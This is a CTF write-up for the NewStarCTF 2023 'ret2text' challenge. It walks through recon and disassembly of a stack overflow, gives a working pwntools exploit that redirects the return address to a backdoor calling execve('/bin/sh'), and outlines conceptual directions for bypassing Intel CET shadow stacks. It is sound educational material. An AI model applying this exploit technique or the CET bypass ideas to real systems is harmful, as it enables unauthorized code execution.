# ret2text — [NewStarCTF 2023 Public Track]ret2text-WP

**Category:** Binary Exploitation / pwn
**Arch:** x86-64, dynamically linked, not stripped, No PIE
**Technique:** Stack Buffer Overflow → ret2text (jump directly to a pre-existing backdoor function)

---

## 1. Recon

```bash
file ./ret
```

```
./ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

```bash
checksec --file=ret
```

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Baseline reading:

- **64-bit** → System V AMD64 calling convention: the first three integer/pointer arguments go in `rdi`, `rsi`, `rdx`.
- **No canary** → nothing to leak or preserve before smashing the saved return address.
- **NX enabled** → no shellcode execution directly on the stack; any redirection of control flow has to land on existing executable code.
- **No PIE** → every address inside the binary (functions, strings, gadgets) is fixed at compile time, no leak required.
- **SHSTK / IBT: Enabled** → these two flags are new compared to previous challenges in this series. They indicate the binary was compiled with Intel CET (Control-flow Enforcement Technology) support. See the dedicated section below — this turned out to be the actual "hook" of the challenge, even though it ended up not mattering in practice.

## 2. Looking for a shortcut (the binary is not stripped)

Since the binary is **not stripped**, the full symbol table is available:

```bash
nm ./ret | grep " T "
```

```
00000000004011fb T backdoor
00000000004010e0 T _dl_relocate_static_pie
0000000000401284 T _fini
0000000000401000 T _init
0000000000401196 T init
000000000040122e T main
00000000004010b0 T _start
```

`backdoor` stands out immediately — a function the program never calls on its own, sitting right there in `.text`. This matches the challenge's name: **ret2text**, the general technique of redirecting execution to *any* useful code already present in the binary's text segment (as opposed to **ret2win**, which usually refers to a single, obviously-named "win" function — here it's named `backdoor` instead, but the idea is identical).

## 3. Disassembling `backdoor`

```bash
objdump -d ./ret --disassemble=backdoor
```

```asm
00000000004011fb <backdoor>:
  4011fb: f3 0f 1e fa          endbr64
  4011ff: 55                   push   %rbp
  401200: 48 89 e5             mov    %rsp,%rbp
  401203: 48 8d 05 fa 0d 00 00 lea    0xdfa(%rip),%rax
  40120a: 48 89 c7             mov    %rax,%rdi
  40120d: e8 5e fe ff ff       call   401070 <puts@plt>
  401212: ba 00 00 00 00       mov    $0x0,%edx
  401217: be 00 00 00 00       mov    $0x0,%esi
  40121c: 48 8d 05 f4 0d 00 00 lea    0xdf4(%rip),%rax
  401223: 48 89 c7             mov    %rax,%rdi
  401226: e8 65 fe ff ff       call   401090 <execve@plt>
  40122b: 90                   nop
  40122c: 5d                   pop    %rbp
  40122d: c3                   ret
```

Key observations:

- `endbr64` at the very top is the IBT landing marker required for any *indirect* branch target under CET. It is irrelevant here because the exploit reaches `backdoor` via a plain `ret` with a hardcoded address, not an indirect jump/call — IBT only polices indirect control-flow transfers.
- `push %rbp` / `mov %rsp,%rbp` — this function **does** set up a frame pointer, unlike the previous challenge in this series.
- A `puts()` call prints a banner, then:
  ```
  rdx = 0        (3rd arg)
  rsi = 0        (2nd arg)
  rdi = <string>  (1st arg)
  call execve@plt
  ```
  This matches the `execve(const char *pathname, char *const argv[], char *const envp[])` signature exactly: `execve(<string>, NULL, NULL)`.

Since the binary is **dynamically linked**, `execve` here is a genuine libc function call through the PLT — not a raw syscall. There is no need to set `rax` to a syscall number or issue `syscall`/`int 0x80`; the library call handles that internally.

### Verifying the string argument

```bash
objdump -s -j .rodata ./ret | grep -A2 "402010"
```

```
402010 6f6e7321 2121002f 62696e2f 73680057  ons!!!./bin/sh.W
```

Confirms the string at the referenced address is `/bin/sh`. So `backdoor()` is fully self-contained:

```
execve("/bin/sh", NULL, NULL);
```

No ROP chain is needed — a single redirection of the return address to the start of `backdoor` is enough.

## 4. Disassembling `main` — finding the bug

```bash
objdump -d ./ret --disassemble=main
```

```asm
000000000040122e <main>:
  401232: 55                   push   %rbp
  401233: 48 89 e5             mov    %rsp,%rbp
  401236: 48 83 ec 20          sub    $0x20,%rsp
  ...
  401262: 48 8d 45 e0          lea    -0x20(%rbp),%rax
  401266: ba 00 01 00 00       mov    $0x100,%edx
  40126b: 48 89 c6             mov    %rax,%rsi
  40126e: bf 00 00 00 00       mov    $0x0,%edi
  401273: b8 00 00 00 00       mov    $0x0,%eax
  401278: e8 03 fe ff ff       call   401080 <read@plt>
  40127d: b8 00 00 00 00       mov    $0x0,%eax
  401282: c9                   leave
  401283: c3                   ret
```

- `sub $0x20,%rsp` → 32 bytes reserved for the local buffer.
- `read(0, rbp-0x20, 0x100)` → reads from stdin into a 32-byte buffer, but allows **up to 256 bytes**.

This is the bug. Unlike `gets()` (no bound at all), `read()` here *does* have an upper bound — but that bound (256) is far larger than the actual buffer size (32), so the overflow is just as exploitable. The general rule: an overflow exists whenever the "max length" passed to a read-style function doesn't match the real size of the destination buffer, regardless of whether that function is itself unbounded (`gets`) or bounded-but-mismatched (`read`, `fread`, etc.).

## 5. Offset calculation

`main` has a saved frame pointer this time (`push %rbp` / `mov %rsp,%rbp`), so the formula used is the one *with* a frame pointer:

```
padding = (distance from buffer start to saved rbp) + 8
        = 0x20 + 8
        = 40 bytes
```

40 bytes of filler, then the next 8 bytes (64-bit) overwrite the saved return address directly.

## 6. On CET (SHSTK / IBT) — why it didn't matter here, and what would be needed if it did

`checksec` reported both `SHSTK: Enabled` and `IBT: Enabled`. These two flags belong to Intel CET (Control-flow Enforcement Technology), a hardware-level mitigation aimed directly at this class of attack:

- **Shadow Stack (SHSTK):** the CPU keeps a second, protected copy of return addresses. On every `ret`, the CPU compares the address being returned to against its own shadow-stack record. If a return address was overwritten manually (exactly what a stack overflow does), the two copies disagree and the CPU faults before the jump happens.
- **IBT (Indirect Branch Tracking):** requires every valid *indirect* jump/call target to begin with an `endbr64` instruction, preventing redirection to arbitrary mid-function gadgets via indirect branches.

### Why the exploit worked anyway

`checksec` reporting these flags only means the **binary** was compiled with CET support (`-fcf-protection`, visible as `endbr64` instructions throughout). Whether CET is actually *enforced* at runtime depends on three independent layers all being true simultaneously:

1. The **CPU** must support CET in hardware (relatively recent Intel/AMD silicon).
2. The **kernel** must support and have enabled it (Linux 5.18+ with the right configuration).
3. The **binary** must be compiled with CET support (confirmed by the presence of `endbr64`).

In many environments — virtual machines, older kernels, certain distros — layer 1 or 2 is absent even when layer 3 is fully present. That's exactly what happened here: the exploit succeeded on the first try with a plain, unmodified return-address overwrite, meaning Shadow Stack was not actually being enforced on the machine the binary was running on.

### How to actually check whether CET is enforced on a system

```bash
# Does the CPU advertise support at all?
cat /proc/cpuinfo | grep -o 'shstk\|ibt'
```

If neither flag appears, the CPU itself doesn't support CET and the question is moot regardless of kernel/binary settings. If it does appear, kernel-level enablement can be checked through thread feature status or libc's own reporting, but in practice **the most reliable test remains empirical**: attempt the exploit. A clean, successful hijack (as happened here) strongly implies SHSTK is not enforced; a fault occurring exactly at the `ret` instruction, even though the overwritten address itself is valid and correctly aligned, is the signature of a shadow-stack mismatch rather than a garden-variety segfault from a bad address.

### What bypassing an actually-enforced Shadow Stack would require

This is conceptual — it depends heavily on the specific binary and gadgets available, so no single recipe applies universally — but the core principle is:

**Shadow Stack is only checked at `ret`.** It polices nothing else. If control flow can be redirected without ever executing a `ret` instruction, the shadow-stack comparison is never triggered at all.

Known directions:

1. **JOP / COP (Jump/Call-Oriented Programming):** instead of chaining gadgets that each end in `ret`, chain gadgets that end in an indirect `jmp`/`call` through a register. Since these never execute `ret`, SHSTK has nothing to compare. IBT, however, *would* still apply here — any such gadget's target must begin with a valid `endbr64`, which significantly narrows the pool of usable gadgets and is the actual reason IBT and SHSTK are deployed together (they close each other's gap).
2. **Abusing legitimate shadow-stack-aware mechanisms:** certain system facilities (signal handlers, `setjmp`/`longjmp` under CET-aware libc) are permitted to adjust the shadow stack as part of normal, legitimate control-flow changes. Exploiting bugs in how such mechanisms validate or restore shadow-stack state is an active, narrower area of research rather than a general technique.
3. **Attacking the shadow stack's own memory mapping:** in older or buggy CET implementations, if the shadow stack's backing memory is itself reachable through some other writable primitive, it could in principle be corrupted directly — but this is implementation- and version-specific and not something that generalizes across targets.

For the difficulty level of challenges like this one (BUUCTF/NewStarCTF Easy/Medium, focused on teaching core ROP fundamentals), genuinely CET-enforced targets are rare; this territory tends to show up in Hard/Insane-rated challenges or more modern exploit-development research. For now, knowing *that the mitigation exists and why it didn't apply here* is the right depth — JOP-based bypasses are a natural next topic once more advanced challenges actually require them. I will address in the future, as they are likely to arise during difficult challenges.


## 7. Reconstructed C

```c
#include <stdio.h>
#include <unistd.h>

void backdoor(void)
{
    puts("...");               // banner string, exact text not fully recovered
    execve("/bin/sh", NULL, NULL);
}

int main(void)
{
    char buf[32];

    puts("Welcome to NewStar CTF!!");
    puts("Show me your magic");

    read(0, buf, 0x100);       // bug: allows up to 256 bytes into a 32-byte buffer

    return 0;
}
```

`backdoor` is never called from `main` in the source — it only exists as dead code the compiler kept around (and the binary wasn't stripped), which is precisely what makes it reachable via a return-address overwrite.

## 8. Exploit

```python
from pwn import *

context.arch = 'amd64'

p = process('./ret')
# p = remote('<host>', <port>)

backdoor_addr = 0x4011fb   # from nm

payload  = b"A" * 40               # 32-byte buffer + 8-byte saved rbp
payload += p64(backdoor_addr)      # overwrite return address

p.sendline(payload)
p.interactive()
```

No `recvuntil`/`recv` is used before sending — as established in the previous challenge, output destined for a pipe (rather than a real terminal) is typically fully buffered by glibc and may never flush before the program blocks on `read()`, so waiting on it risks an indefinite hang.

### On 64-bit stack alignment

A standing rule from earlier challenges: landing on a function via `ret` instead of a normal `call` can leave the stack misaligned relative to what the System V AMD64 ABI expects (16-byte alignment before a `call`), which some libc-internal code paths (certain `movaps` instructions, for instance) can crash on. The usual fix is prepending a single extra `ret` gadget to "eat" 8 bytes and restore alignment:

```python
ret_gadget = 0x40101a   # ROPgadget --binary ./ret --only "ret"
payload += p64(ret_gadget)
payload += p64(backdoor_addr)
```

In this particular case, the exploit succeeded on the first attempt **without** the extra `ret` — the sequence of instructions executed inside `backdoor` before reaching `execve` happened to leave the stack correctly aligned on its own. This isn't guaranteed in general; it's always worth testing the simple version first and falling back to the alignment gadget only if a crash occurs.

### Result

```
Welcome to NewStar CTF!!
Show me your magic
Congratulations!!!
$ id
uid=1000(Gantosay) gid=1000(Gantosay) ...
```

## 9. Tools used

| Tool | Purpose |
|---|---|
| `file` | Identify architecture, linking type, strip status |
| `checksec` | Check canary / NX / PIE / RELRO / CET (SHSTK, IBT) |
| `nm` | Search the symbol table for a usable backdoor function |
| `objdump -d` | Disassemble `backdoor` and `main`, confirm the bug and the function's self-contained `execve` call |
| `objdump -s -j .rodata` | Verify the exact string passed to `execve` |
| `ROPgadget` | Locate a standalone `ret` gadget, kept on hand in case stack alignment was needed |
| `pwntools` | Build and send the final exploit |

## 10. Key takeaways

- **ret2text** generalizes ret2win: redirect execution to *any* reachable, useful code already in `.text`, not necessarily a function named for the purpose.
- A bounded read (`read(fd, buf, N)`) is just as exploitable as an unbounded one (`gets`) whenever `N` exceeds the real destination buffer size — the bound only matters relative to the buffer, not in absolute terms.
- **`checksec` reporting a mitigation as "Enabled" describes the binary's compilation flags, not the runtime environment.** Hardware mitigations like Intel CET require CPU, kernel, and binary support to all align before they're actually enforced; a target can advertise `SHSTK: Enabled` and still have no shadow-stack enforcement in practice.
- Shadow Stack only validates control flow at `ret`; a redirection that never executes `ret` (jump/call-oriented programming) sidesteps it entirely, though IBT independently constrains where indirect branches may land.
- Stack alignment issues on 64-bit targets are situational, not guaranteed — test the direct approach before reaching for an alignment gadget.
